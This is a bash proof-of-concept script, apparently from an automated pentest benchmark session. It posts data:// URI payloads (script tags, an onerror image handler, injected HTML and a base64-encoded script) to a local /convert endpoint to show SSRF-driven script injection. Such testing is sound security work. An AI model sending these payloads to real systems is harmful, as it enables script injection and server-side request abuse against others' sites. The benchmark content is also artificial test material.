#!/bin/bash
# POC: Demonstrates SSRF vulnerability allowing data:// URI protocol to inject arbitrary HTML/JavaScript content
# Target: ./repo
# Created: 2025-11-10T15:02:06.356Z
# Session: benchmark-XBEN-033-24-mht9ijkn

# SSRF with data:// URI Protocol Injection POC
# Target: /convert endpoint with url parameter
# Purpose: Inject arbitrary HTML/JavaScript via data:// protocol

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/convert"

echo "[*] Testing SSRF with data:// URI Protocol Injection"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test 1: Basic data:// URI with script tag
echo "[*] Test 1: Injecting <script>alert(1)</script> via data:// URI"
PAYLOAD="data:text/html,<script>alert(1)</script>"
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")

RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${ENCODED_PAYLOAD}")

if echo "$RESPONSE" | grep -q "<script>alert(1)</script>"; then
    echo "[+] SUCCESS: JavaScript payload found in response"
    echo "[+] Response excerpt:"
    echo "$RESPONSE" | grep -o "<script>alert(1)</script>" | head -1
    echo ""
else
    echo "[-] Script payload not found in response"
    echo "[-] Response: $RESPONSE" | head -20
fi

# Test 2: data:// URI with HTML content and event handler
echo "[*] Test 2: Injecting HTML with onerror event handler via data:// URI"
PAYLOAD2="data:text/html,<img src=x onerror='alert(2)'>"
ENCODED_PAYLOAD2=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD2'))")

RESPONSE2=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${ENCODED_PAYLOAD2}")

if echo "$RESPONSE2" | grep -q "onerror"; then
    echo "[+] SUCCESS: Event handler payload found in response"
    echo "[+] Response excerpt:"
    echo "$RESPONSE2" | grep -o "<img[^>]*>" | head -1
    echo ""
else
    echo "[-] Event handler payload not found in response"
fi

# Test 3: data:// URI with arbitrary HTML content
echo "[*] Test 3: Injecting arbitrary HTML via data:// URI"
PAYLOAD3="data:text/html,<h1>INJECTED CONTENT</h1>"
ENCODED_PAYLOAD3=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD3'))")

RESPONSE3=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${ENCODED_PAYLOAD3}")

if echo "$RESPONSE3" | grep -q "INJECTED CONTENT"; then
    echo "[+] SUCCESS: Injected HTML content found in response"
    echo "[+] Response excerpt:"
    echo "$RESPONSE3" | grep -o "<h1>INJECTED CONTENT</h1>"
    echo ""
else
    echo "[-] Injected HTML not found in response"
fi

# Test 4: Verify that data:// protocol is processed by urlopen()
echo "[*] Test 4: Testing data:// protocol processing with base64 encoded content"
BASE64_PAYLOAD="data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YV9wcm90b2NvbCcpPC9zY3JpcHQ+"
ENCODED_PAYLOAD4=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$BASE64_PAYLOAD'))")

RESPONSE4=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=${ENCODED_PAYLOAD4}")

if echo "$RESPONSE4" | grep -q "data_protocol\|script"; then
    echo "[+] SUCCESS: Base64 encoded data:// payload processed"
    echo "[+] Response contains script content"
else
    echo "[-] Base64 encoded payload not found or not processed"
fi

echo ""
echo "[*] POC Test Complete"